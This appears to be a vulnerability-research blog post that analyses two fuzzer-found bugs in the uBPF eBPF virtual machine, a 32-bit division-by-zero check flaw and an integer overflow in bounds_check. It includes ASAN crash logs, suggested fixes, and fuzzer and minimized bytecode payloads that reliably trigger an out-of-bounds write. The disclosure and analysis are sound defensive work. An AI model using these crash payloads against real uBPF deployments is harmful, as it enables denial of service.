---
title: Attacking uBPF VM - Part 3 Bug Analysis - (EN)
date: 2023-03-22 00:00:00 +0000
categories: [Fuzzing]
tags: [english, fuzzing, ubpf]
mermaid: true
---

Two bugs were discovered during the audit of the eBPF virtual machine. The first one is related to a security validation issue that leads to a division by zero (undefined behavior).

The second one is an integer overflow in a security check, causing reads and writes to memory areas outside of those allocated to the VM.

Articles:
- [Attacking uBPF VM - Part 1 Reconnaissance - (EN)](https://joachimff.github.io/posts/Attacking-uBPF-VM-Part-1-Reconnaissance-(EN)/)
- [Attacking uBPF VM - Part 2 Writing the fuzzer - (EN)](https://joachimff.github.io/posts/Attacking-uBPF-VM-Part-2-Writing-the-fuzzer-(EN)/)
- [Attacking uBPF VM - Part 3 Bug Analysis - (EN)](https://joachimff.github.io/posts/Attacking-uBPF-VM-Part-3-Bug-Analysis-(EN)/)

___This article has been translated with the help of AI.___

# Undefined behaviour (division by 0)
## Report
__Crash ASAN__
```rust
ubpf_vm.c:318:68: runtime error: division by zero
AddressSanitizer:DEADLYSIGNAL
=================================================================
==15886==ERROR: AddressSanitizer: FPE on unknown address 0x7fbceed73399 (pc 0x7fbceed73399 bp 0x7ffc7ff74080 sp 0x7ffc7ff73fa0 T0)
    #0 0x7fbceed73398 in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:318
    #1 0x55aebd96414c in j_fuzzer::run_prgm::h35d4b4310f796c6f src/main.rs:337
    #2 0x55aebd964503 in j_fuzzer::main::h7dd45b78eaec2e84 src/main.rs:409
    ...
    #18 0x55aebd95c03d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0xc03d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: FPE /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:318 in ubpf_exec
==15886==ABORTING
```

__Payload__
```c
000=>opcode:0xDC, dst:0x00, src:0x02, offset:0x1018, imm:0x00000040 //be16 dst       => r0 = htobe64(r0)
001=>opcode:0x84, dst:0x09, src:0x03, offset:0xBBF3, imm:0x29559BAB //dst = -dst     => r9 = -r9
002=>opcode:0x3C, dst:0x02, src:0x01, offset:0x1202, imm:0x796ED6EC //div32 dst, src => r2 = r2 / r1
```

## Analyse

The ASAN report allows to identify the part of the code that causes the division by 0:
```c
static uint32_t u32(uint64_t x) { return x; }
...
case EBPF_OP_DIV_IMM:
	reg[inst.dst] = u32(inst.imm) ? u32(reg[inst.dst]) / u32(inst.imm) : 0; // Ok
	reg[inst.dst] &= UINT32_MAX;
	break;
case EBPF_OP_DIV_REG:
	//instruction à l'origine du crash:
	//   le controle se fait sur la valuer sur les 64bits de reg[inst.src]
	//   alors que la division est faite seulement sur les 32 low bits
	reg[inst.dst] = reg[inst.src] ? u32(reg[inst.dst]) / u32(reg[inst.src]) : 0; 
	reg[inst.dst] &= UINT32_MAX;
	break;
```

The observed bug is rather simple: in theory, before each division operation with a register, its value should be checked to ensure that it is different from zero. If so, the division is performed. Otherwise, the division is not performed and the instruction returns 0.

However, in the case of 32-bit divisions, the total value of the register is checked, whereas the division is performed only on the low 32 bits. This means that if the register has a value on the high 32 bits but not on the low ones, the security check will pass but the division will be performed on 0, thus resulting in undefined behavior.

To fix this bug, it is necessary to cast the value of the source register to u32 before checking its value:
```c
	reg[inst.dst] = u32(reg[inst.src]) ? u32(reg[inst.dst]) / u32(reg[inst.src]) : 0; 
	reg[inst.dst] &= UINT32_MAX;
	break;
```


We notice that in the implementation of division by an immediate value, the value is correctly cast before being checked.

# Unauthorized memory access 

This bug is interesting because it allows for uncontrolled memory access. In some cases, these vulnerabilities can be exploited to execute code or cause a denial of service on the target system.

## Report

__Crash ASAN__
```rust
ubpf_vm.c:1023:52: runtime error: pointer index expression with base 0xfffffffffffffffe overflowed to 0x000000000006
AddressSanitizer:DEADLYSIGNAL
=================================================================
==5323==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f186676d9bf bp 0x7ffd41f64fb0 sp 0x7ffd41f64ed0 T0)
==5323==The signal is caused by a READ memory access.
==5323==Hint: address points to the zero page.
    #0 0x7f186676d9be in memcpy /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
    #1 0x7f186676d9be in ubpf_mem_store /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:235
    #2 0x7f186676d9be in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533
    ...
    #20 0x55b4d9509b9d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0x8b9d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34 in memcpy
==5323==ABORTING
```

__Payload__
```rust
//add32 dst, src      => r3 = r3 + r9
000=> opcode:0x0C, dst:0x03, src:0x09, offset:0xD33A, imm:0xFE3EA1E3
//stdw [dst+off], imm =>*(uint64_t *) (r4 + 0xE062) = 0x991DB628
001=> opcode:0x7A, dst:0x04, src:0x04, offset:0xE062, imm:0x991DB628
//mul32 dst, imm      => r2 = r2 * 0x95458E15
002=> opcode:0x24, dst:0x08, src:0x02, offset:0x0694, imm:0x95458E15
//mul dst, imm        => r5 = r5 * 0xCE5B94D3
003=> opcode:0x27, dst:0x05, src:0x00, offset:0xD418, imm:0xCE5B94D3
```

After analysis, instruction 0x001 is the cause of the crash.

## Bug

First observation: the virtual machine crashes only when executed with ASAN enabled. In this case, the bounds_check function does not return an error when attempting to access memory at an address outside the VM space. Access to memory at the same address causes a segmentation fault.

Otherwise, the bounds_check function correctly performs its job and returns an error when attempting to access memory outside the virtual machine. Memory access is then not executed, and the virtual machine stops with the following error message:

```rust
uBPF error: out of bounds memory store at PC 1, addr 0xffffffffffffe063, size 8
mem 0x5555555bb730/8092 stack 0x7fffffffd4c0/512
```

We will try to modify the payload to minimize it and make the bug trigger on every execution, not just when ASAN is enabled.

The first function to study is bounds_check. According to the ASAN error message, we know that it has an integer overflow causing unauthorized memory access:

```c
//Appel initial
bounds_check(vm, (char*)reg[inst.src] + inst.offset, size, "load", cur_pc, mem, mem_len, stack)

bounds_check(
    const struct ubpf_vm* vm, 
    void* addr,                //(char*)reg[inst.src] + inst.offset
    int size,                  //size = 8
    const char* type,          //"load"
    uint16_t cur_pc,
    void* mem,
    size_t mem_len,
    void* stack)
{

    if (!vm->bounds_check_enabled)
        return true;
	//integer overflow si addr + size > taille max d'un pointer
    else if (mem && (addr >= mem && ((char*)addr + size) <= ((char*)mem + mem_len))) { 
        /* Context access */
        return true;
	//integer overflow si addr + size > taille max d'un pointer
    } else if (addr >= stack && ((char*)addr + size) <= ((char*)stack + UBPF_STACK_SIZE)) { 
        /* Stack access */
        return true;
    } else {
        vm->error_printf(...);
        return false;
    }
}
```

This function has two integer overflows:

-   The first block of code compares if the address and size are within the limits of the context. If the sum of the address and size exceeds the maximum allowed pointer value, it can cause an overflow.
    
-   The second block of code compares if the address and size are within the limits of the stack. If the sum of the address and size exceeds the maximum allowed pointer value, it can also cause an overflow.
    

In the context of the function, the address (addr) is calculated by adding the value of the source register (reg[inst.src]) to the offset (inst.offset). The size (size) represents the number of bytes to read and is defined by the memory access operations. It is possible to read or write a maximum of 8 bytes.

To reproduce the bug, we can control the value of the source register, but the size is determined by the memory access operations. To trigger the bug, we need to ensure that the sum of the source register + instruction offset is between `0xFFFF_FFFF_FFFF_FFFF` and `0xFFFF_FFFF_FFFF_FFF8` and execute a read or write operation of 8 bytes.

This value will pass the security checks of bounds_check, but the memory accesses will be performed on the value of the source register + offset, which is `0xFFFF_FFFF_FFFF_FFFF` and not part of the program's allocated memory.

Below is a minimized payload that can reproduce the bug 100%:

```rust
//r[6] = 0
EbpfBytecode::from(EbpfInstr::new(0xb7, 0x0, 0x6, 0x0, 0x0 as u32 as i32)),  
//[r6] = 0xFFFFFFFFFFF
EbpfBytecode::from(EbpfInstr::new(0x17, 0x0, 0x6, 0x0, 0x1 as u32 as i32)),  
//*(*(uint64_t *) (r[6] + off) = imm => 0xFFFFFFF + 0 = 0 <= 
EbpfBytecode::from(EbpfInstr::new(0x7A, 0x0, 0x6, 0x0, 0x0 as u32 as i32)),  
```

Execution:
```rust
000=> [0xB7, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
001=> [0x17, 0x06, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00]
002=> [0x7A, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
[+]VM addr: 0x608000000020
[+]FN Loaded
AddressSanitizer:DEADLYSIGNAL
=================================================================
==6773==ERROR: AddressSanitizer: SEGV on unknown address 0xffffffffffffffff (pc 0x7f636e1a7d65 bp 0x000000001f9c sp 0x7fffc1b60c50 T0)
==6773==The signal is caused by a WRITE memory access.
    #0 0x7f636e1a7d64 in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533
    #1 0x558fa1e8b44e in j_fuzzer::run_prgm::h35d4b4310f796c6f src/main.rs:337
	...
    #18 0x558fa1e84b9d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0x8b9d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533 in ubpf_exec
==6773==ABORTING
```

We can indeed see an attempt to write to the address 0xffffffffffffffff, as expected.

## Exploitation

We are limited here by the size of the `size` argument passed to the `bounds_check` function, which cannot exceed 8 bytes. Therefore, it is only possible to read from or write to the last 8 bytes of memory, which always results in a segmentation fault.

This type of bug can only be exploited for denial-of-service attacks and unfortunately does not allow for code execution.
